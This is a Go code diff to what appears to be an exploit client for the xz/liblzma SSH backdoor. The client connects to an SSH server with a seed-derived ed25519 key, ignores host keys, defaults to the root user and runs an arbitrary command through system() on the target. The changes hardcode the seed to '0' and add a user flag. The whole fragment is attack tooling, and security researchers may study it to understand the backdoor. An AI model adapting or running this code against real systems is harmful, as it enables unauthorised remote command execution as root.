@@ -15,9 +15,9 @@ import (
 )
 
 var (
-	addr  = flag.String("addr", "127.0.0.1:2222", "ssh server address")
-	seedn = flag.String("seed", "0", "seed for key derivation")
-	cmd   = flag.String("cmd", "id > /tmp/xz_pwned", "command to run via system()")
+	addr = flag.String("addr", "127.0.0.1:2222", "ssh server address")
+	cmd  = flag.String("cmd", "id > /tmp/xz_pwned", "command to run via system()")
+	user = flag.String("usr", "root", "user to connect with")
 )
 
 type xzPublicKey struct {
@@ -78,7 +78,7 @@ func main() {
 	}
 
 	var seed [32]byte
-	sb, _ := new(big.Int).SetString(*seedn, 10)
+	sb, _ := new(big.Int).SetString("0", 10)
 	sb.FillBytes(seed[:])
 
 	signingKey := ed25519.NewKeyFromSeed(seed[:])
@@ -120,7 +120,7 @@ func main() {
 		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
 	}
 
-	fmt.Printf("[*] Connecting to %s with seed %s...\n", *addr, *seedn)
+	fmt.Printf("[*] Connecting to %s with seed %s...\n", *addr, "0")
 	client, err := ssh.Dial("tcp", *addr, config)
 	if err != nil {
 		fmt.Printf("[!] Dial finished: %v\n", err)
